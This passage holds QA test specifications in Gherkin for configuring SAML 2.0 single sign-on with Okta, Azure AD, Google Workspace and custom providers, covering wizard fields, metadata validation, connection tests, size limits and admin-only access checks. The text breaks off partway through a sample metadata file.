# Test Specifications: SAML-SSO-CONFIG — Configure SAML 2.0 SSO for Major Providers

## Coverage Matrix
| AC | Test(s) | Category |
|----|---------|----------|
| AC-1 | T-1.1, T-1.2 | happy-path |
| AC-2 | T-2.1, T-2.2 | happy-path |
| AC-3 | T-3.1, T-3.2 | happy-path |
| AC-4 | T-4.1, T-4.2 | happy-path |
| AC-5 | T-5.1, T-5.2, T-5.3 | error-handling |
| AC-6 | T-6.1 | happy-path |
| AC-7 | T-7.1, T-7.2 | boundary |
| AC-AUTH-1 | T-8.1 | security |
| AC-AUTH-2 | T-8.2 | security |

## Test Cases

### T-1.1: Display Okta Configuration Wizard
**Maps to:** AC-1
**Category:** happy-path

```gherkin
Feature: SAML SSO Configuration Wizard

  Scenario: Organization admin accesses Okta configuration wizard
    Given I am logged in as user "admin@company.com" with role "organization_admin"
    And I am on the SSO configuration page "/settings/sso"
    And no SSO provider is currently configured
    When I select "Okta" from the provider dropdown
    Then I should see the Okta configuration wizard
    And I should see a form field labeled "Okta Domain URL" with placeholder "your-domain.okta.com"
    And I should see a form field labeled "Entity ID" with placeholder "http://www.okta.com/exk1example"
    And I should see a form field labeled "SSO URL" with placeholder "https://your-domain.okta.com/app/your-app/exk1example/sso/saml"
    And I should see a "Certificate Upload" section with file upload input
    And I should see a "Test Connection" button in disabled state
```

**Test Data:**
- Admin user: `{ email: "admin@company.com", role: "organization_admin", status: "active", org_id: "org-123" }`
- Organization: `{ id: "org-123", name: "Test Company", sso_configured: false }`

**Preconditions:**
- User is authenticated with organization admin role
- Organization exists and has no SSO configured
- SSO configuration page is accessible

### T-1.2: Okta Wizard Field Validation
**Maps to:** AC-1
**Category:** happy-path

```gherkin
  Scenario: Okta wizard validates required fields
    Given I am on the Okta configuration wizard
    And all required fields are empty
    When I click "Next" without filling any fields
    Then I should see validation errors:
      | Field | Error Message |
      | Okta Domain URL | "Okta domain URL is required" |
      | Entity ID | "Entity ID is required" |
      | SSO URL | "SSO URL is required" |
      | Certificate | "Certificate upload is required" |
    And I should not be able to proceed to the next step
```

**Test Data:**
- Empty form state: all fields contain empty strings

**Preconditions:**
- User is on Okta configuration wizard page
- No form data has been entered

### T-2.1: Valid SAML Metadata Validation
**Maps to:** AC-2
**Category:** happy-path

```gherkin
  Scenario: System validates correct SAML metadata
    Given I am on the Okta configuration wizard
    When I enter the following valid SAML metadata:
      | Field | Value |
      | Okta Domain URL | "test-company.okta.com" |
      | Entity ID | "http://www.okta.com/exk1fxample123" |
      | SSO URL | "https://test-company.okta.com/app/testapp/exk1fxample123/sso/saml" |
    And I upload a valid certificate file "okta-cert.pem"
    And I click "Validate Metadata"
    Then I should see a success message "SAML metadata validation successful"
    And I should see a green checkmark next to "Metadata Format"
    And I should see a green checkmark next to "Certificate Validity"
    And I should see a green checkmark next to "Endpoint Accessibility"
    And the "Test Connection" button should be enabled
```

**Test Data:**
- Valid Okta metadata:
  ```
  Domain: "test-company.okta.com"
  Entity ID: "http://www.okta.com/exk1fxample123"
  SSO URL: "https://test-company.okta.com/app/testapp/exk1fxample123/sso/saml"
  ```
- Valid X.509 certificate: `okta-cert.pem` (2048-bit RSA, expires 2027-01-01)

**Preconditions:**
- User is on Okta configuration wizard
- Certificate file exists and is accessible
- Network connectivity to Okta endpoints is available

### T-2.2: Certificate Validity Check
**Maps to:** AC-2
**Category:** happy-path

```gherkin
  Scenario: System validates certificate expiration and format
    Given I am on the SAML configuration wizard
    When I upload a certificate file "valid-cert.pem"
    And the certificate expires in 30 days
    And I click "Validate Metadata"
    Then I should see a warning message "Certificate expires in 30 days - consider renewal"
    And I should see a yellow warning icon next to "Certificate Validity"
    But the validation should still pass
    And the "Test Connection" button should be enabled
```

**Test Data:**
- Certificate expiring soon: expires 2026-07-15 (30 days from test date 2026-06-15)
- Valid certificate format: X.509 PEM format

**Preconditions:**
- System date is 2026-06-15
- Valid certificate file is available for upload

### T-3.1: Successful Test Connection
**Maps to:** AC-3
**Category:** happy-path

```gherkin
  Scenario: Test connection succeeds with valid configuration
    Given I have entered valid SAML configuration for Okta:
      | Field | Value |
      | Entity ID | "http://www.okta.com/exk1test123" |
      | SSO URL | "https://dev.okta.com/app/testapp/exk1test123/sso/saml" |
    And the metadata validation has passed
    When I click the "Test Connection" button
    Then I should see a loading indicator "Testing connection..."
    And within 10 seconds I should see "Connection test successful"
    And I should see "Test SAML request completed successfully"
    And I should see a green checkmark icon
    And the "Save Configuration" button should be enabled
```

**Test Data:**
- Test SAML configuration pointing to Okta sandbox environment
- Mock SAML response: `<samlp:Response Status="Success" ID="test-response-123">`

**Preconditions:**
- Valid SAML metadata has been entered and validated
- Test Okta environment is available and responsive
- Application has network access to Okta test endpoints

### T-3.2: Test Connection Failure with Error Details
**Maps to:** AC-3
**Category:** error-handling

```gherkin
  Scenario: Test connection fails and displays specific error information
    Given I have entered SAML configuration with unreachable SSO URL:
      | Field | Value |
      | SSO URL | "https://nonexistent.okta.com/app/fake/sso/saml" |
    When I click the "Test Connection" button
    Then I should see a loading indicator "Testing connection..."
    And within 10 seconds I should see "Connection test failed"
    And I should see specific error details:
      """
      Error: Unable to reach SSO endpoint
      Details: DNS resolution failed for nonexistent.okta.com
      Suggestion: Verify the SSO URL is correct and the endpoint is accessible
      """
    And I should see a red X icon
    And the "Save Configuration" button should remain disabled
```

**Test Data:**
- Invalid SSO URL: "https://nonexistent.okta.com/app/fake/sso/saml"
- Expected DNS error response

**Preconditions:**
- SAML configuration form is partially filled
- Network connectivity is available but target URL is invalid

### T-4.1: Azure AD Configuration Wizard
**Maps to:** AC-4
**Category:** happy-path

```gherkin
  Scenario: Organization admin accesses Azure AD configuration wizard
    Given I am logged in as an organization admin
    And I am on the SSO configuration page
    When I select "Azure AD" from the provider dropdown
    Then I should see the Azure AD configuration wizard
    And I should see a form field labeled "Tenant ID" with placeholder "12345678-1234-1234-1234-123456789012"
    And I should see a form field labeled "Application ID" with placeholder "87654321-4321-4321-4321-210987654321"
    And I should see a form field labeled "Federation Metadata URL" with placeholder "https://login.microsoftonline.com/tenant-id/federationmetadata/2007-06/federationmetadata.xml"
    And I should see help text "Find these values in your Azure AD Enterprise Application settings"
    And I should see a "Download Metadata" button
```

**Test Data:**
- Azure AD provider selection: "Azure AD" option in dropdown
- Sample Azure AD values for placeholders

**Preconditions:**
- User has organization admin role
- SSO configuration page is accessible
- Azure AD is available as a provider option

### T-4.2: Google Workspace Configuration Wizard
**Maps to:** AC-4
**Category:** happy-path

```gherkin
  Scenario: Organization admin accesses Google Workspace configuration wizard
    Given I am logged in as an organization admin
    And I am on the SSO configuration page
    When I select "Google Workspace" from the provider dropdown
    Then I should see the Google Workspace configuration wizard
    And I should see a form field labeled "Entity ID" with placeholder "google.com/a/yourdomain.com"
    And I should see a form field labeled "SSO URL" with placeholder "https://accounts.google.com/o/saml2/idp?idpid=your-idp-id"
    And I should see a form field labeled "Certificate" with file upload input
    And I should see help text "Download certificate from Google Admin Console > Security > Set up single sign-on"
    And I should see a link "Google Workspace SAML Setup Guide" that opens in a new tab
```

**Test Data:**
- Google Workspace provider selection
- Google-specific placeholder values and help text

**Preconditions:**
- User has organization admin role
- Google Workspace is available as a provider option

### T-5.1: Malformed XML Metadata Error
**Maps to:** AC-5
**Category:** error-handling

```gherkin
  Scenario: System handles malformed SAML XML metadata
    Given I am on the SAML configuration wizard
    When I enter the following metadata with malformed XML:
      | Field | Value |
      | Entity ID | "not-valid-xml<>unclosed" |
      | SSO URL | "https://valid.okta.com/sso" |
    And I click "Validate Metadata"
    Then I should see an error message "Invalid metadata format"
    And I should see specific error details:
      """
      Error: Malformed XML in Entity ID
      Details: Unclosed XML tag detected
      Suggestion: Ensure Entity ID follows valid URI format without XML characters
      """
    And I should see a red X icon next to "Metadata Format"
    And the "Test Connection" button should remain disabled
```

**Test Data:**
- Malformed Entity ID: "not-valid-xml<>unclosed"
- Valid SSO URL for contrast

**Preconditions:**
- User is on SAML configuration wizard
- Metadata validation is triggered

### T-5.2: Expired Certificate Error
**Maps to:** AC-5
**Category:** error-handling

```gherkin
  Scenario: System handles expired certificate upload
    Given I am on the SAML configuration wizard
    When I upload an expired certificate file "expired-cert.pem"
    And I click "Validate Metadata"
    Then I should see an error message "Certificate validation failed"
    And I should see specific error details:
      """
      Error: Certificate has expired
      Details: Certificate expired on 2025-12-01, current date is 2026-06-15
      Suggestion: Download a new certificate from your identity provider
      """
    And I should see a red X icon next to "Certificate Validity"
    And the certificate upload field should be highlighted in red
```

**Test Data:**
- Expired certificate: `expired-cert.pem` (expired 2025-12-01)
- Current system date: 2026-06-15

**Preconditions:**
- Expired certificate file is available for upload
- System date validation is working

### T-5.3: Unreachable Endpoint Error
**Maps to:** AC-5
**Category:** error-handling

```gherkin
  Scenario: System handles unreachable SAML endpoints
    Given I am on the SAML configuration wizard
    When I enter an unreachable SSO URL "https://down.provider.com/sso"
    And I click "Validate Metadata"
    Then I should see an error message "Endpoint accessibility check failed"
    And I should see specific error details:
      """
      Error: Unable to reach SSO endpoint
      Details: Connection timeout after 5 seconds
      Suggestion: Check if the endpoint URL is correct and the server is running
      """
    And I should see a red X icon next to "Endpoint Accessibility"
    And I should see a "Retry Validation" button
```

**Test Data:**
- Unreachable URL: "https://down.provider.com/sso"
- Timeout threshold: 5 seconds

**Preconditions:**
- Network connectivity is available but target endpoint is down
- Validation timeout is configured to 5 seconds

### T-6.1: Configuration Save and Activation
**Maps to:** AC-6
**Category:** happy-path

```gherkin
  Scenario: Successfully save validated SAML configuration
    Given I have completed SAML configuration for Okta:
      | Field | Value |
      | Entity ID | "http://www.okta.com/exk1prod123" |
      | SSO URL | "https://prod.okta.com/app/myapp/exk1prod123/sso/saml" |
    And all validation checks have passed
    And the test connection was successful
    When I click the "Save Configuration" button
    Then I should see a loading indicator "Saving configuration..."
    And within 5 seconds I should see a success message "SAML SSO configuration saved successfully"
    And I should see next steps instructions:
      """
      Configuration saved! Next steps:
      1. Test user authentication: Have a user try logging in via SSO
      2. Monitor authentication logs for the next 24 hours
      3. Notify users about the new SSO login option
      """
    And I should see a "Test User Authentication" button
    And I should be redirected to the SSO management dashboard
```

**Test Data:**
- Complete Okta configuration with all valid values
- Organization ID for saving: "org-123"

**Preconditions:**
- All validation checks have passed
- Test connection was successful
- User has permission to save SSO configuration

### T-7.1: Warning for Existing SSO Provider
**Maps to:** AC-7
**Category:** boundary

```gherkin
  Scenario: System warns when changing existing SSO provider
    Given my organization already has "Azure AD" configured as the active SSO provider
    And 150 users have used SSO authentication in the last 30 days
    When I attempt to select "Okta" as the new provider
    Then I should see a warning modal with the message:
      """
      Warning: Changing SSO Provider
      Your organization currently has Azure AD configured as the active SSO provider.
      Changing to Okta will affect all 150 users who currently use SSO authentication.
      
      Users will need to use the new Okta SSO flow for future logins.
      
      Are you sure you want to proceed?
      """
    And I should see two buttons: "Cancel" and "Proceed with Change"
    And the "Proceed with Change" button should be styled as a warning button
```

**Test Data:**
- Existing SSO provider: "Azure AD"
- Active SSO users in last 30 days: 150
- New provider selection: "Okta"

**Preconditions:**
- Organization has Azure AD SSO already configured and active
- SSO usage analytics are available
- User has permission to modify SSO configuration

### T-7.2: Confirmation Required for Provider Change
**Maps to:** AC-7
**Category:** boundary

```gherkin
  Scenario: User must confirm SSO provider change
    Given I see the SSO provider change warning modal
    When I click "Proceed with Change"
    Then I should see a confirmation dialog:
      """
      Final Confirmation
      Type "CHANGE SSO PROVIDER" to confirm this action.
      This will immediately deactivate Azure AD SSO for all users.
      """
    And I should see a text input field
    When I type "CHANGE SSO PROVIDER" exactly
    And I click "Confirm Change"
    Then the existing Azure AD configuration should be deactivated
    And I should proceed to the Okta configuration wizard
    And I should see a notice "Previous Azure AD configuration has been deactivated"
```

**Test Data:**
- Required confirmation text: "CHANGE SSO PROVIDER"
- Case-sensitive matching required

**Preconditions:**
- User has seen and accepted the initial warning
- Provider change dialog is displayed

## Security Tests

### T-8.1: Unauthenticated Access Rejected
**Maps to:** AC-AUTH-1
**Category:** security

```gherkin
  Scenario: Reject SSO configuration access without authentication
    Given no authentication token is present in the request
    When I make a GET request to "/api/sso/config"
    Then I should receive a 401 Unauthorized response
    And the response body should contain:
      """
      {
        "error": "Authentication required",
        "code": "UNAUTHENTICATED",
        "message": "A valid authentication token is required to access SSO configuration"
      }
      """
    And no SSO configuration data should be returned
```

**Test Data:**
- Request without Authorization header
- Expected 401 response code

**Preconditions:**
- SSO configuration endpoint exists
- Authentication middleware is active

### T-8.2: Insufficient Permissions Rejected
**Maps to:** AC-AUTH-2
**Category:** security

```gherkin
  Scenario: Reject SSO configuration access for non-admin users
    Given I am authenticated as user "user@company.com" with role "member"
    And the user does not have "organization_admin" permission
    When I make a GET request to "/api/sso/config"
    Then I should receive a 403 Forbidden response
    And the response body should contain:
      """
      {
        "error": "Insufficient permissions",
        "code": "FORBIDDEN",
        "message": "Organization admin permission is required to access SSO configuration",
        "required_permission": "organization_admin",
        "user_permissions": ["member"]
      }
      """
```

**Test Data:**
- Regular user: `{ email: "user@company.com", role: "member", permissions: ["read_org"] }`
- Required permission: "organization_admin"

**Preconditions:**
- User is authenticated but lacks organization admin role
- Permission checking middleware is active

## Boundary Tests

### T-9.1: Maximum Configuration Limits
**Maps to:** AC-2
**Category:** boundary

```gherkin
  Scenario: Handle maximum field length limits
    Given I am on the SAML configuration wizard
    When I enter a domain URL that is 2049 characters long
    And I click "Validate Metadata"
    Then I should see a validation error "Domain URL must be 2048 characters or less"
    And the field should be highlighted in red
    And I should not be able to proceed until the URL is shortened
```

**Test Data:**
- Maximum URL length: 2048 characters
- Test URL: 2049 character string starting with "https://"

**Preconditions:**
- Field length validation is implemented
- Client-side validation is active

### T-9.2: Special Characters in Entity ID
**Maps to:** AC-2
**Category:** boundary

```gherkin
  Scenario: Handle special characters in Entity ID
    Given I am on the SAML configuration wizard
    When I enter an Entity ID with special characters "http://example.com/ent!ty&id#123"
    And I click "Validate Metadata"
    Then the system should properly encode the special characters
    And validation should pass if the URL is otherwise valid
    And I should see "Entity ID validation successful"
```

**Test Data:**
- Entity ID with special chars: "http://example.com/ent!ty&id#123"
- Proper URL encoding expected: "http://example.com/ent%21ty%26id%23123"

**Preconditions:**
- URL encoding/decoding is implemented
- Special character handling is configured


# Test Specifications: AUTH-SSO-002 — Custom SAML Provider Setup

## Coverage Matrix
| AC | Test(s) | Category |
|----|---------|----------|
| AC-1: Upload valid SAML metadata | T-1.1, T-1.2 | happy-path |
| AC-2: Validate metadata format | T-2.1, T-2.2, T-2.3 | validation |
| AC-3: Configure provider settings | T-3.1, T-3.2 | happy-path |
| AC-4: Test connection | T-4.1, T-4.2 | integration |
| AC-5: Handle upload errors | T-5.1, T-5.2, T-5.3 | error-handling |
| AC-6: File size validation | T-6.1, T-6.2 | boundary |
| NFR-AUTH: Authorization | T-7.1, T-7.2 | authorization |
| NFR-PERF: Performance | T-8.1, T-8.2 | performance |
| NFR-SEC: Security validation | T-9.1, T-9.2, T-9.3 | security |

## Test Cases

### T-1.1: Upload valid SAML metadata XML successfully
**Maps to:** AC-1
**Category:** happy-path

```gherkin
Feature: Custom SAML Provider Setup

  Scenario: Organization admin uploads valid SAML metadata XML
    Given I am logged in as an organization admin
    And I am on the SSO configuration page
    And I have a valid SAML metadata XML file "valid-saml-metadata.xml"
    When I click "Add Custom SAML Provider"
    And I upload the metadata file "valid-saml-metadata.xml"
    And I click "Upload Metadata"
    Then I should see "Metadata uploaded successfully"
    And the provider details should be populated from the metadata
    And the provider should appear in the SSO providers list
```

**Test Data:**
```xml
<!-- valid-saml-metadata.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
                  entityID="https://test-provider.example.com">
  <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
                         Location="https://test-provider.example.com/sso"/>
  </IDPSSODescriptor>
</EntityDescriptor>
```

**Preconditions:**
- User has organization admin role
- SSO configuration feature is enabled for the organization
- No existing SAML provider is configured

### T-1.2: Upload and replace existing SAML metadata
**Maps to:** AC-1
**Category:** happy-path

```gherkin
  Scenario: Replace existing SAML provider with new metadata
    Given I am logged in as an organization admin
    And I have an existing SAML provider configured
    And I have a different valid SAML metadata file "new-provider-metadata.xml"
    When I navigate to the existing provider settings
    And I click "Replace Metadata"
    And I upload the metadata file "new-provider-metadata.xml"
    And I click "Upload Metadata"
    Then I should see "Metadata replaced successfully"
    And the provider details should be updated with new metadata
    And the old provider configuration should be archived
```

**Test Data:**
```xml
<!-- new-provider-metadata.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
                  entityID="https://new-provider.example.com">
  <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
                         Location="https://new-provider.example.com/saml/sso"/>
  </IDPSSODescriptor>
</EntityDescriptor>
```

**Preconditions:**
- User has organization admin role
- Existing SAML provider "test-provider.example.com" is configured and active

### T-2.1: Validate well-formed XML metadata
**Maps to:** AC-2
**Category:** validation

```gherkin
  Scenario: System validates metadata XML format during upload
    Given I am logged in as an organization admin
    And I am on the add SAML provider page
    And I have a well-formed SAML metadata file "wellformed-metadata.xml"
    When I upload the metadata file "wellformed-metadata.xml"
    Then the system should parse the XML successfully
    And I should see "Metadata validated successfully"
    And the provider name should be extracted as "Enterprise IdP"
    And the SSO endpoint should be extracted as "https://idp.enterprise.com/sso"
```

**Test Data:**
```xml
<!-- wellformed-metadata.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
                  entityID="https://idp.enterprise.com">
  <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <NameIDFormat>urn:oasis:names:tc:SAML:2.0:nameid-format:emailAddress</NameIDFormat>
    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
                         Location="https://idp.enterprise.com/sso"/>
  </IDPSSODescriptor>
</EntityDescriptor>
```

**Preconditions:**
- User has organization admin role
- SAML metadata validation service is available

### T-2.2: Reject malformed XML metadata
**Maps to:** AC-2, NFR Error Handling
**Category:** validation

```gherkin
  Scenario: System rejects malformed XML metadata with specific error
    Given I am logged in as an organization admin
    And I am on the add SAML provider page
    And I have a malformed XML file "malformed-metadata.xml"
    When I upload the metadata file "malformed-metadata.xml"
    Then I should see "Invalid metadata format at line 5: Unclosed tag 'IDPSSODescriptor'"
    And the upload should be rejected
    And no provider should be created
```

**Test Data:**
```xml
<!-- malformed-metadata.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
                  entityID="https://broken.example.com">
  <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
                         Location="https://broken.example.com/sso"/>
  <!-- Missing closing tag for IDPSSODescriptor -->
</EntityDescriptor>
```

**Preconditions:**
- User has organization admin role

### T-2.3: Reject non-SAML XML content
**Maps to:** AC-2
**Category:** validation

```gherkin
  Scenario: System rejects valid XML that is not SAML metadata
    Given I am logged in as an organization admin
    And I am on the add SAML provider page
    And I have a valid XML file "non-saml.xml" that is not SAML metadata
    When I upload the metadata file "non-saml.xml"
    Then I should see "Invalid SAML metadata: Missing required EntityDescriptor element"
    And the upload should be rejected
```

**Test Data:**
```xml
<!-- non-saml.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
  <Database>postgres://localhost:5432/app</Database>
  <Features>
    <SSO>enabled</SSO>
  </Features>
</Configuration>
```

**Preconditions:**
- User has organization admin role

### T-3.1: Configure provider settings from metadata
**Maps to:** AC-3
**Category:** happy-path

```gherkin
  Scenario: System extracts and configures provider settings from metadata
    Given I am logged in as an organization admin
    And I have uploaded valid SAML metadata for "Corporate IdP"
    When the metadata is processed
    Then the provider name should be set to "Corporate IdP"
    And the entity ID should be "https://corp-idp.company.com"
    And the SSO URL should be "https://corp-idp.company.com/saml/login"
    And the signing certificate should be extracted and stored
    And I should be able to review these settings before saving
```

**Test Data:**
```xml
<!-- corporate-idp-metadata.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
                  entityID="https://corp-idp.company.com">
  <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <KeyDescriptor use="signing">
      <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:X509Data>
          <ds:X509Certificate>MIIBkTCB+wIJANrpuo...</ds:X509Certificate>
        </ds:X509Data>
      </ds:KeyInfo>
    </KeyDescriptor>
    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
                         Location="https://corp-idp.company.com/saml/login"/>
  </IDPSSODescriptor>
</EntityDescriptor>
```

**Preconditions:**
- User has organization admin role
- Metadata parsing service is available

### T-3.2: Allow manual override of extracted settings
**Maps to:** AC-3
**Category:** happy-path

```gherkin
  Scenario: Admin can manually override extracted provider settings
    Given I am logged in as an organization admin
    And I have uploaded SAML metadata with extracted settings
    And the system has populated the provider form with extracted values
    When I change the provider name from "Corporate IdP" to "Company SSO"
    And I modify the SSO URL from extracted value to "https://sso.company.com/login"
    And I click "Save Configuration"
    Then the provider should be saved with my manual overrides
    And the provider name should be "Company SSO"
    And the SSO URL should be "https://sso.company.com/login"
```

**Test Data:**
- Original extracted name: "Corporate IdP"
- Manual override name: "Company SSO"
- Original extracted SSO URL: "https://corp-idp.company.com/saml/login"
- Manual override SSO URL: "https://sso.company.com/login"

**Preconditions:**
- User has organization admin role
- Valid SAML metadata has been uploaded and processed

### T-4.1: Test connection to SAML provider successfully
**Maps to:** AC-4
**Category:** integration

```gherkin
  Scenario: Test connection to configured SAML provider
    Given I am logged in as an organization admin
    And I have a configured SAML provider "Test Corp IdP"
    When I click "Test Connection" on the provider
    Then the system should make a test request to the SSO endpoint
    And I should see "Connection successful" within 5 seconds
    And the last tested timestamp should be updated
    And the provider status should show as "Active"
```

**Test Data:**
- Provider name: "Test Corp IdP"
- SSO endpoint: "https://test-idp.example.com/sso"
- Expected response: HTTP 200 with valid SAML response

**Preconditions:**
- User has organization admin role
- SAML provider is fully configured
- Test IdP endpoint is accessible and responding

### T-4.2: Test connection fails with clear error message
**Maps to:** AC-4, NFR Error Handling
**Category:** integration

```gherkin
  Scenario: Test connection fails with unreachable endpoint
    Given I am logged in as an organization admin
    And I have a configured SAML provider with unreachable endpoint
    When I click "Test Connection" on the provider
    Then I should see "Cannot connect to provider endpoint. Check URL and firewall settings." within 5 seconds
    And the provider status should show as "Connection Failed"
    And the last tested timestamp should be updated
```

**Test Data:**
- Provider name: "Unreachable IdP"
- SSO endpoint: "https://unreachable-idp.example.com/sso"
- Expected network error: Connection timeout or DNS resolution failure

**Preconditions:**
- User has organization admin role
- SAML provider is configured with unreachable endpoint

### T-5.1: Handle file upload errors gracefully
**Maps to:** AC-5
**Category:** error-handling

```gherkin
  Scenario: Display clear error for unsupported file types
    Given I am logged in as an organization admin
    And I am on the add SAML provider page
    And I have a file "config.pdf" with unsupported format
    When I attempt to upload the file "config.pdf"
    Then I should see "Unsupported file type. Please upload XML files only."
    And the upload should be rejected immediately
    And no processing should occur
```

**Test Data:**
- File: "config.pdf" (PDF document instead of XML)
- File size: 1MB
- MIME type: "application/pdf"

**Preconditions:**
- User has organization admin role

### T-5.2: Handle network errors during upload
**Maps to:** AC-5
**Category:** error-handling

```gherkin
  Scenario: Handle network interruption during file upload
    Given I am logged in as an organization admin
    And I am uploading a large SAML metadata file
    When the network connection is interrupted during upload
    Then I should see "Upload failed due to network error. Please try again."
    And I should have an option to "Retry Upload"
    And the partial upload should be cleaned up
```

**Test Data:**
- File: "large-metadata.xml" (2MB SAML metadata file)
- Network interruption: Simulated connection drop after 50% upload

**Preconditions:**
- User has organization admin role
- Network simulation capability is available

### T-5.3: Handle invalid certificate in metadata
**Maps to:** AC-5, NFR Error Handling
**Category:** error-handling

```gherkin
  Scenario: Display specific error for invalid certificate in metadata
    Given I am logged in as an organization admin
    And I have SAML metadata with an invalid/expired certificate
    When I upload the metadata file "expired-cert-metadata.xml"
    Then I should see "Invalid certificate: Certificate expired on 2023-12-31" with link to certificate requirements documentation
    And the upload should be rejected
    And I should see a link to "Certificate Requirements Documentation"
```

**Test Data:**
```xml
<!-- expired-cert-metadata.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
                  entityID="https://expired-cert.example.com">
  <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <KeyDescriptor use="signing">
      <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:X509Data>
          <ds:X509Certificate>MIIExpiredCert...</ds:X509Certificate>
        </ds:X509Data>
      </ds:KeyInfo>
    </KeyDescriptor>
    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
                         Location="https://expired-cert.example.com/sso"/>
  </IDPSSODescriptor>
</EntityDescriptor>
```

**Preconditions:**
- User has organization admin role
- Certificate validation service is enabled

### T-6.1: Accept metadata files within size limits
**Maps to:** AC-6
**Category:** boundary

```gherkin
  Scenario: Accept metadata file at maximum allowed size
    Given I am logged in as an organization admin
    And I have a valid SAML metadata file that is exactly 10MB
    When I upload the metadata file
    Then the upload should be accepted
    And the file should be processed successfully
    And I should see "Metadata uploaded successfully"
```

**Test Data:**
- File: "max-size-metadata.xml" (exactly 10MB, valid SAML metadata)
- File content: Valid SAML metadata with extensive provider information

**Preconditions:**
- User has organization admin role
- File size limit is set to 10MB

### T-6.2: Reject metadata files exceeding size limits
**Maps to:** AC-6
**Category:** boundary

```gherkin
  Scenario: Reject metadata file exceeding maximum size
    Given I am logged in as an organization admin
    And I have a metadata file that is 11MB (exceeding 10MB limit)
    When I attempt to upload the oversized file
    Then I should see "File size exceeds maximum limit of 10MB. Current file size: 11MB."
    And the upload should be rejected immediately
    And no processing should occur
```

**Test Data:**
- File: "oversized-metadata.xml" (11MB)
- Maximum allowed size: 10MB
- File content: Valid SAML metadata but oversized

**Preconditions:**
- User has organization admin role
- File size limit is enforced at 10MB

### T-7.1: Reject unauthenticated access
**Maps to:** NFR-AUTH
**Category:** authorization

```gherkin
  Scenario: Unauthenticated user cannot access SAML configuration
    Given I am not logged in
    When I attempt to access the SAML provider setup page directly
    Then I should receive a 401 Unauthorized response
    And I should be redirected to the login page
    And no SAML configuration data should be accessible
```

**Test Data:**
- Request URL: "/admin/sso/saml/setup"
- Expected status: 401 Unauthorized
- Expected redirect: "/login"

**Preconditions:**
- User is not authenticated
- SAML configuration requires authentication

### T-7.2: Reject insufficient role access
**Maps to:** NFR-AUTH
**Category:** authorization

```gherkin
  Scenario: Non-admin user cannot configure SAML providers
    Given I am logged in as a regular user (non-admin)
    When I attempt to access the SAML provider setup page
    Then I should receive a 403 Forbidden response
    And I should see "Access denied. Organization admin role required."
    And no SAML configuration functionality should be accessible
```

**Test Data:**
- User role: "member" (not "admin")
- Request URL: "/admin/sso/saml/setup"
- Expected status: 403 Forbidden
- Expected message: "Access denied. Organization admin role required."

**Preconditions:**
- User is authenticated but has "member" role
- Organization admin role is required for SSO configuration

### T-8.1: Metadata validation completes within performance requirements
**Maps to:** NFR-PERF
**Category:** performance

```gherkin
  Scenario: Metadata validation completes within 2 seconds
    Given I am logged in as an organization admin
    And I have a standard-sized SAML metadata file (500KB)
    When I upload the metadata file
    Then the validation should complete in less than 2 seconds
    And I should see the validation result within the time limit
    And the extracted settings should be displayed
```

**Test Data:**
- File: "standard-metadata.xml" (500KB, typical enterprise SAML metadata)
- Performance requirement: < 2 seconds for validation
- Timing measurement: Start from upload initiation to validation completion

**Preconditions:**
- User has organization admin role
- System is under normal load conditions

### T-8.2: Test connection completes within performance requirements
**Maps to:** NFR-PERF
**Category:** performance

```gherkin
  Scenario: Test connection completes within 5 seconds
    Given I am logged in as an organization admin
    And I have a configured SAML provider
    When I click "Test Connection"
    Then the connection test should complete in less than 5 seconds
    And I should see the test result within the time limit
    And the provider status should be updated
```

**Test Data:**
- Provider: Fully configured SAML provider with responsive endpoint
- Performance requirement: < 5 seconds for test connection
- Expected endpoint response time: < 1 second

**Preconditions:**
- User has organization admin role
- SAML provider endpoint is responsive
- Network conditions are normal

### T-9.1: Validate HTTPS URLs only
**Maps to:** NFR-SEC
**Category:** security

```gherkin
  Scenario: Reject SAML metadata with HTTP URLs
    Given I am logged in as an organization admin
    And I have SAML metadata containing HTTP (non-HTTPS) URLs
    When I upload the metadata file "insecure-metadata.xml"
    Then I should see "Security error: All URLs must use HTTPS. Found HTTP URL: http://insecure.example.com/sso"
    And the upload should be rejected
    And no provider configuration should be created
```

**Test Data:**
```xml
<!-- insecure-metadata.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
                  entityID="http://insecure.example.com">
  <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
                         Location="http://insecure.example.com/sso"/>
